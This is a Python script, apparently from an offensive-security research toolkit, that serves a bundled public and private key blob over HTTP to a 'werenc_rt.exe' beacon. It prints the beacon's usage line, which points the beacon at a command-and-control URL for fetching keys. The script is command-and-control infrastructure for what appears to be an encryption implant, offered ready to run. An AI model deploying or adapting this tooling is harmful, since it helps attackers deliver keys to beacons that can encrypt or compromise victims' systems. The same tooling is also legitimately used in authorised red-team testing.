#!/usr/bin/env python3
"""
werenc_keyserver.py - Serve BYOK keys for werenc_rt.exe beacon mode

Reads werenc_pub.key and werenc_priv.key, concatenates them into a
length-prefixed blob, and serves it over HTTP:

   

The beacon fetches this blob on first checkin with --c2 http://host:port/keys

Usage:
    python3 werenc_keyserver.py                        # default port 8443
    python3 werenc_keyserver.py --port 9999
    python3 werenc_keyserver.py --pub my_pub.key --priv my_priv.key

Author: 0xsp research
"""

import argparse
import struct
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path


def build_key_blob(pub_path: str, priv_path: str) -> bytes:
    pub = Path(pub_path).read_bytes()
    priv = Path(priv_path).read_bytes()
    blob = struct.pack("<I", len(pub)) + pub + struct.pack("<I", len(priv)) + priv
    print(f"[*] pub:  {len(pub)} bytes")
    print(f"[*] priv: {len(priv)} bytes")
    print(f"[*] blob: {len(blob)} bytes")
    return blob


class KeyHandler(BaseHTTPRequestHandler):
    key_blob = b""

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(self.key_blob)))
        self.end_headers()
        self.wfile.write(self.key_blob)
        print(f"[+] served {len(self.key_blob)} bytes to {self.client_address[0]}")

    def log_message(self, fmt, *args):
        pass


def main():
    parser = argparse.ArgumentParser(description="WerEnc BYOK key server")
    parser.add_argument("--port", type=int, default=8443)
    parser.add_argument("--pub", default="werenc_pub.key")
    parser.add_argument("--priv", default="werenc_priv.key")
    args = parser.parse_args()

    try:
        KeyHandler.key_blob = build_key_blob(args.pub, args.priv)
    except FileNotFoundError as e:
        print(f"[!] {e}")
        print("[!] run: werenc_byok.exe --generate-keys")
        sys.exit(1)

    server = HTTPServer(("0.0.0.0", args.port), KeyHandler)
    print(f"\n[*] serving on http://0.0.0.0:{args.port}/keys")
    print(f"[*] beacon usage: werenc_rt.exe --beacon benign --c2 http://<ip>:{args.port}/keys")
    print("[*] Ctrl+C to stop\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] stopped")
        server.server_close()


if __name__ == "__main__":
    main()
